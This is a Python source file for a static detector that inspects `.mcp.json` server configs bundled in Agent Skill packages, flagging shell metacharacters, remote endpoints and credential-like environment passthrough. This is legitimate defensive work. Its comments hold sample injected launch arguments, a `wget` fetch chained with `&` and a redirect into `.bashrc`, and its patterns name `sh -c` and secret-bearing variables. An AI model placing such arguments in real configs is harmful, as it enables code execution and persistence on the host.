"""Bundled `.mcp.json` detector (coding spec FR-PAR-010, FR-DET-080; catalog
ids CODE-01/MCP-04/CRED-04/GEN-01, corrected 2026-07-27 from the previously
mislabelled MCP-01/MCP-02 - see `_TEST_ITEM_IDS`' own comment for the full
per-rule justification against 企业Skill安全评估测试维度清单.xlsx).

A Skill package may ship its own MCP server configuration. That file decides
which servers the agent will launch, with which arguments, and which of the
host's environment variables they inherit - which makes it one of the most
direct lateral-movement surfaces an Agent Skill has.

SECURITY (FR-DET-130 / SEC-INP-020): STATIC ANALYSIS ONLY. This module parses
the declaration and never connects to any endpoint it names, never resolves a
hostname, and never executes a declared command.

SECURITY: this detector is in `required_engines`, so an uncaught exception here
fails the whole scan closed. Every parse path returns a Finding instead of
raising - see `_parse_config`.
"""

from __future__ import annotations

import hashlib
import ipaddress
import json
import re
from typing import Any
from urllib.parse import urlsplit

from skillscan_core import (
    DetectionCategory,
    EngineCapability,
    EngineMetadata,
    EngineResult,
    Finding,
    Severity,
)

from engine_runner.detectors._engine_base import run_with_deadline

_ENGINE_NAME = "inhouse-mcp-config"

# Shapes in a server declaration that indicate the launch line will be
# SHELL-INTERPRETED rather than exec'd as an argv vector: a command separator
# (`;`), a pipe (`|`, which also covers `||`), an AND-list (`&&`), legacy
# backtick command substitution, `$(...)` command substitution, and the
# explicit `sh -c` / `bash -c` form.
#
# 2026-07-27 (final review, F-4): this used to be `[;&|`$><]`, i.e. it flagged
# a BARE `$`. `${VAR}` / `${VAR:-default}` / `$HOME/path` substitution in
# `command`/`args`/`env`/`url` is a first-class, documented feature of the very
# `.mcp.json` format this detector exists to read, so an entirely ordinary
# config - `{"command":"npx","args":["-y","server","${WORKSPACE_DIR}"]}` -
# produced HIGH @ 0.9 `mcp.command_injection_server`. This detector is in
# `required_engines`, so that forced REVIEW on the internal tier and, via
# policies/gate/v1.yaml's `tier_block_overrides` (`block_on_severity: HIGH`
# for `public`), an automatic BLOCK on the public tier.
#
# `$(` stays flagged - command substitution IS shell execution, and it cannot
# be confused with `${` variable expansion.
#
# 2026-07-28 (VM re-review, N-1): that same commit ALSO dropped `&`, `>` and
# `<`, and that part was wrong. `&` separates commands in a shell exactly as
# `;` does, so `["srv.js", "&", "wget http://x/y"]` went completely unreported
# while the `;` spelling of the identical attack was still caught - the
# "meaningless outside a shell" argument I used to drop it applies verbatim to
# `;`, which was kept, so the two had no business being treated differently.
# `>` is worse still: `["server.js", ">", "/home/u/.bashrc"]` is a ready-made
# persistence write. Restored. The usual false-positive argument for `&` (query
# strings in URLs) does not apply here - this pattern is only ever matched
# against `command`/`args`, never against `url`, which `_scan_one_server`
# enforces structurally.
#
# Consequence accepted: an `<placeholder>`-style argument value now matches.
# A waivable false positive is the right trade against a silent, ready-made
# redirection channel.
_SHELL_METACHARS = re.compile(
    r"[;|`<>]"  # separator / pipe / backtick substitution / redirection (covers >>)
    r"|&&"  # AND-list
    r"|(?<!&)&(?!&)"  # a lone `&`: command separator + backgrounding
    r"|\$\("  # command substitution - NOT `${` expansion
    r"|\bsh\s+-c\b"
    r"|\bbash\s+-c\b"
)

# Environment variables whose passthrough hands the server host credentials.
_SENSITIVE_ENV = re.compile(
    r"(TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|_KEY$|APIKEY|API_KEY|^AWS_|^AZURE_|^GCP_)",
    re.IGNORECASE,
)

# "localhost" is a reserved name (RFC 6761 §6.3): it is DEFINED to mean
# loopback, so treating it as local is a literal-name match, not a DNS lookup.
_LOCAL_HOSTNAMES = frozenset({"localhost"})

# Bumped whenever the host-classification logic below changes meaning (there
# is no single regex `.pattern` to hash any more - see _is_remote_endpoint).
_HOST_CLASSIFICATION_VERSION = "ipaddress-v2:loopback|private|link_local+localhost"

_RISK_DESCRIPTIONS: dict[str, str] = {
    "mcp.command_injection_server": (
        "随包 .mcp.json 声明的 MCP server 启动命令中含 shell 元字符或 `sh -c` 形式。"
        "Agent 启动该 server 时会以 shell 解释这条命令，攻击者可借此在宿主机上执行任意"
        "指令——这条路径不经过 Skill 的脚本目录，因此绕开了针对 scripts/ 的所有检测。"
    ),
    "mcp.remote_server_endpoint": (
        "随包 .mcp.json 指向一个非本机的 MCP server 端点。Agent 会把工具调用连同其上下文"
        "发往该端点，而端点内容与工具描述由对方控制，可用于工具描述投毒或数据外泄；"
        "在要求零外网连接的部署中，这也直接违反网络边界约束。"
    ),
    "mcp.excessive_env_passthrough": (
        "随包 .mcp.json 把疑似凭据的环境变量透传给 MCP server 进程。该 server 由 Skill "
        "自带、不受本系统信任，拿到 token/密钥后可在本系统的检测视野之外使用它们。"
    ),
    "mcp.malformed_config": (
        "随包 .mcp.json 无法被解析为合法的 MCP 配置。无法解析意味着无法审查其中声明了"
        "哪些 server、以什么权限运行——本系统对这部分内容不具备可见性，需人工确认该文件"
        "的来源与意图。"
    ),
}

_MAX_CONFIG_BYTES = 1 * 1024 * 1024  # 1 MiB: real configs are a few KiB

# Explicit rule_id -> (detection-catalog id, category). Deriving it from the
# rule name (a conditional on a substring) is exactly the pattern Task 7 is
# removing elsewhere in this codebase - do not reintroduce it here.
#
# 2026-07-27 (Task 8 SAD coverage-matrix review): this task's own scope never
# audited this detector when Task 7 hardened test_item_id elsewhere - the
# original values below were the SAME class of defect Task 7 removed:
# syntactically valid catalog ids that don't match what each rule actually
# detects. Corrected against 企业Skill安全评估测试维度清单.xlsx directly,
# not by pattern-matching the rule name to something MCP-shaped:
#   - mcp.command_injection_server was MCP-01 ("工具描述投毒" - tool
#     DESCRIPTION poisoning with hidden instructions) - this rule detects
#     shell metacharacters in a server's LAUNCH COMMAND, an ordinary command-
#     injection vector that happens to be discovered via a bundled MCP
#     config rather than a script file. -> CODE-01 (命令注入/系统命令执行),
#     the same catalog item bandit's B602/603/605/607 map to.
#   - mcp.remote_server_endpoint was MCP-02 ("工具影射/冒充" - server name
#     impersonating a popular one) - has nothing to do with impersonation.
#     -> MCP-04 (server配置卫生), whose own description explicitly includes
#     "限制出站" (restrict outbound) as one of its checked signals - a
#     non-local endpoint is exactly an egress-restriction config issue.
#   - mcp.excessive_env_passthrough was also MCP-02, equally unrelated.
#     -> CRED-04 (敏感数据外泄): its description is "将私钥/凭据/会话/隐私等
#     敏感数据发送给不应接收的外部主体" - handing TOKEN/SECRET/API_KEY-shaped
#     env vars to a Skill-bundled, untrusted MCP server process IS sending
#     credentials to a party that should not receive them.
#   - mcp.malformed_config was MCP-01, equally unrelated (poisoning requires
#     a parseable description to poison). No D9 item covers "config file
#     could not be parsed at all" (unlike PERM-04 for SKILL.md, there is no
#     MCP-scoped "manifest missing/unparseable" item) -> GEN-01, honest
#     "detected but unclassified" rather than a forced fit.
_TEST_ITEM_IDS: dict[str, tuple[str, DetectionCategory]] = {
    "mcp.command_injection_server": ("CODE-01", DetectionCategory.CODE),
    "mcp.remote_server_endpoint": ("MCP-04", DetectionCategory.BUNDLED_COMPONENT),
    "mcp.excessive_env_passthrough": ("CRED-04", DetectionCategory.DATA_CREDENTIAL),
    "mcp.malformed_config": ("GEN-01", DetectionCategory.BUNDLED_COMPONENT),
}

# Each rule's severity, one place (2026-07-27 final review, F-3). Previously
# passed literal at each `_finding(...)` call site, which meant `_metadata()`
# could not hash it: raising/lowering a rule's severity left ruleset_digest ->
# toolchain_digest -> cache_key unchanged, so every already-scanned package
# kept the verdict computed under the OLD severity. A rule has exactly one
# severity, so a table is also simply the honest shape for it.
_SEVERITIES: dict[str, Severity] = {
    "mcp.command_injection_server": Severity.HIGH,
    "mcp.remote_server_endpoint": Severity.MEDIUM,
    "mcp.excessive_env_passthrough": Severity.HIGH,
    "mcp.malformed_config": Severity.LOW,
}

# Same single-source reasoning as `_SEVERITIES`: confidence gates gate.py's
# review_confidence branch, so it is scoring-relevant and must be hashed.
_CONFIDENCE = 0.9


def _metadata() -> EngineMetadata:
    # SECURITY (INV-7, 2026-07-27 final review F-3): `_TEST_ITEM_IDS` must be
    # part of this hash. Task 9 already established the rule for exactly this
    # (it folded test_item_id into skillscan_core's
    # `_static_keyword_ruleset_digest` so that a mapping-only correction still
    # invalidates cached verdicts) - but the two detectors THIS milestone
    # created were re-labelled twice without the same treatment, so both
    # relabels shipped with an unchanged digest: `submit_scan` returned the
    # existing scan_job for every already-scanned package and reeval's
    # toolchain-staleness check saw nothing to redo.
    hasher = hashlib.sha256()
    for rule_id in sorted(_RISK_DESCRIPTIONS):
        test_item_id, category = _TEST_ITEM_IDS[rule_id]
        hasher.update(
            f"{rule_id}:{test_item_id}:{category.value}:"
            f"{_SEVERITIES[rule_id].value}:{_CONFIDENCE}\n".encode()
        )
    hasher.update(f"{_SHELL_METACHARS.pattern}\n".encode())
    hasher.update(f"{_SENSITIVE_ENV.pattern}\n".encode())
    hasher.update(f"{_HOST_CLASSIFICATION_VERSION}\n".encode())
    # a size threshold IS a detection rule here: a config over the cap is
    # reported as mcp.malformed_config rather than parsed, so moving it
    # changes what this detector finds and must bust the digest.
    hasher.update(f"max_config_bytes:{_MAX_CONFIG_BYTES}\n".encode())
    for hostname in sorted(_LOCAL_HOSTNAMES):
        hasher.update(f"local_hostname:{hostname}\n".encode())
    return EngineMetadata(
        name=_ENGINE_NAME,
        version="1.0.0",
        ruleset_digest=hasher.hexdigest(),
        capabilities=frozenset({EngineCapability.STATIC}),
    )


def _finding(rule_id: str, *, path: str, title: str, evidence: str) -> Finding:
    # severity/confidence/test_item_id/category all come from the module-level
    # tables so `_metadata()` hashes exactly the values recorded here - see
    # `_SEVERITIES`' comment.
    test_item_id, category = _TEST_ITEM_IDS[rule_id]
    return Finding(
        rule_id=rule_id,
        test_item_id=test_item_id,
        category=category,
        title=title,
        severity=_SEVERITIES[rule_id],
        confidence=_CONFIDENCE,
        source_engine=_ENGINE_NAME,
        source_capability=EngineCapability.STATIC,
        file_path=path,
        # SECURITY (INV-9): a digest of the offending declaration, never the
        # declaration itself.
        snippet_hash=hashlib.sha256(evidence.encode("utf-8")).hexdigest(),
        evidence_redacted=_RISK_DESCRIPTIONS[rule_id],
    )


def _is_mcp_config(path: str) -> bool:
    return path.rsplit("/", 1)[-1] == ".mcp.json"


def _is_remote_endpoint(url: str) -> bool:
    """Return True if `url` names a server this detector should flag as a
    non-local dependency (`mcp.remote_server_endpoint`).

    STATIC ANALYSIS ONLY (SEC-INP-020/FR-DET-130): this NEVER resolves a
    hostname. A literal IP address written in the URL is classified straight
    off its bits via the stdlib `ipaddress` module (loopback/RFC1918-private/
    link-local => local, everything else => remote) - no I/O involved, just
    parsing the text that is already in front of us. `localhost` is exempted
    by name because RFC 6761 §6.3 *defines* it as loopback; that is a literal
    match, not a lookup.

    Anything else - any hostname that isn't a literal IP or "localhost" - is
    treated CONSERVATIVELY AS REMOTE. Proving a hostname like `mcp.internal`
    actually points at this host would require DNS resolution, and this
    detector must never perform any (that is what makes it static analysis).
    An over-flagged internal hostname is a false positive a human can waive;
    an under-flagged tunnel to a real remote endpoint is not recoverable.

    Do NOT reach for `libs/common/config.is_internal_host()` here even though
    it looks like the same question - it calls `socket.getaddrinfo()` to do
    real DNS resolution, which is a runtime egress-config check, not static
    content analysis. Using it here would violate this module's SEC-INP-020/
    FR-DET-130 STATIC ANALYSIS ONLY constraint. The two helpers must stay
    separate even though "just call the existing helper" looks tempting.
    """
    try:
        host = urlsplit(url).hostname
    except ValueError:
        return True  # unparseable location: fail closed, cannot prove it's local
    if not host:
        return True
    if host.lower() in _LOCAL_HOSTNAMES:
        return False
    try:
        ip = ipaddress.ip_address(host)
    except ValueError:
        return True  # a hostname, not a literal IP - see docstring: conservatively remote
    return not (ip.is_loopback or ip.is_private or ip.is_link_local)


def _parse_config(data: bytes) -> dict[str, Any] | None:
    """Return the mcpServers mapping, or None if this file cannot be read as
    one. NEVER raises - see the module docstring."""
    if len(data) > _MAX_CONFIG_BYTES:
        return None
    try:
        parsed = json.loads(data.decode("utf-8"))
    except (ValueError, UnicodeDecodeError, RecursionError):
        return None
    if not isinstance(parsed, dict):
        return None
    servers = parsed.get("mcpServers")
    if not isinstance(servers, dict):
        return None
    return servers


def _scan_one_server(path: str, name: str, spec: Any) -> list[Finding]:
    if not isinstance(spec, dict):
        return [
            _finding(
                "mcp.malformed_config",
                path=path,
                title=f"MCP server 定义格式非法：{name}",
                evidence=f"{name}:{type(spec).__name__}",
            )
        ]

    findings: list[Finding] = []

    command = spec.get("command")
    args = spec.get("args")
    parts: list[str] = []
    if isinstance(command, str):
        parts.append(command)
    if isinstance(args, list):
        parts.extend(a for a in args if isinstance(a, str))
    joined = " ".join(parts)
    if joined and _SHELL_METACHARS.search(joined):
        findings.append(
            _finding(
                "mcp.command_injection_server",
                path=path,
                title=f"MCP server 启动命令含 shell 元字符：{name}",
                evidence=joined,
            )
        )

    url = spec.get("url")
    if isinstance(url, str) and url and _is_remote_endpoint(url):
        findings.append(
            _finding(
                "mcp.remote_server_endpoint",
                path=path,
                title=f"MCP server 指向非本机端点：{name}",
                evidence=url,
            )
        )

    env = spec.get("env")
    if isinstance(env, dict):
        leaked = sorted(k for k in env if isinstance(k, str) and _SENSITIVE_ENV.search(k))
        if leaked:
            findings.append(
                _finding(
                    "mcp.excessive_env_passthrough",
                    path=path,
                    title=f"MCP server 透传疑似凭据的环境变量：{name}",
                    evidence=",".join(leaked),
                )
            )

    return findings


def scan(files: dict[str, bytes]) -> tuple[Finding, ...]:
    findings: list[Finding] = []
    for path, data in files.items():
        if not _is_mcp_config(path):
            continue
        servers = _parse_config(data)
        if servers is None:
            findings.append(
                _finding(
                    "mcp.malformed_config",
                    path=path,
                    title="随包 .mcp.json 无法解析",
                    evidence=path,
                )
            )
            continue
        for name, spec in servers.items():
            findings.extend(_scan_one_server(path, str(name), spec))
    return tuple(findings)


class McpConfigDetector:
    """`DetectionEngine` Protocol implementation (skillscan_core.DetectionEngine)."""

    @property
    def metadata(self) -> EngineMetadata:
        return _metadata()

    def analyze(self, files: dict[str, bytes], *, deadline: float | None = None) -> EngineResult:
        # Deadline handling is shared with every other floor detector - see
        # _engine_base.run_with_deadline (added in Task 1).
        return run_with_deadline(self.metadata, scan, files, deadline)
